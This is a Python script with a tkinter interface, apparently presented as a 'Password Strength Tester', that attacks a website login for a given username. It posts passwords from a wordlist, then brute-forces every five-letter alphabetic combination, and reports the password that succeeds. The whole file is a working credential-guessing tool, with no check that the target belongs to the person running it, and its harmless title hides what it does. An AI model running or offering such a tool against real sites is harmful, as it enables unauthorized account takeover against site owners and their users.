import requests
import tkinter as tk
from tkinter import filedialog, messagebox
import itertools
import string

def start_attack():
    url = url_entry.get()
    username = username_entry.get()
    password_file = file_entry.get()

    if not url or not username:
        messagebox.showerror("Error", "Please enter the website URL and username")
        return

    passwords = []
    if password_file:
        try:
            with open(password_file, "r") as file:
                passwords = file.read().splitlines()
        except Exception as e:
            messagebox.showerror("Error", str(e))
            return

    for password in passwords:
        if try_login(url, username, password):
            return
    
    brute_force_attack(url, username)

def try_login(url, username, password):
    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data)
        result_text.insert(tk.END, f"Test: {username} | {password}...\n")
        result_text.update()
        if "Welcome" in response.text:
            messagebox.showinfo("Success", f"The correct password was found: {password}")
            return True
    except Exception as e:
        messagebox.showerror("Error", str(e))
    return False

def brute_force_attack(url, username):
    messagebox.showinfo("Brut Force", "No password found in dictionary, starting Brute Force attack")
    chars = string.ascii_letters  # A-Z + a-z
    for password in itertools.product(chars, repeat=5):
        password = ''.join(password)
        if try_login(url, username, password):
            return
    messagebox.showinfo("Finished", "Valid password not found")

def browse_file():
    filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    file_entry.delete(0, tk.END)
    file_entry.insert(0, filename)

# Create application window
root = tk.Tk()
root.title("Password Strength Tester")

# Enter website URL
tk.Label(root, text="Enter website URL:").pack()
url_entry = tk.Entry(root, width=50)
url_entry.pack()

# Enter username
tk.Label(root, text="Enter username:").pack()
username_entry = tk.Entry(root, width=50)
username_entry.pack()

# Select password file button
tk.Label(root, text="Select password file:").pack()
file_entry = tk.Entry(root, width=50)
file_entry.pack()
tk.Button(root, text="Browse", command=browse_file).pack()

# Start attack button
tk.Button(root, text="Start test", command=start_attack, fg="white", bg="blue").pack()

# Results display area
tk.Label(root, text="Results:").pack()
result_text = tk.Text(root, height=10, width=50)
result_text.pack()

root.mainloop()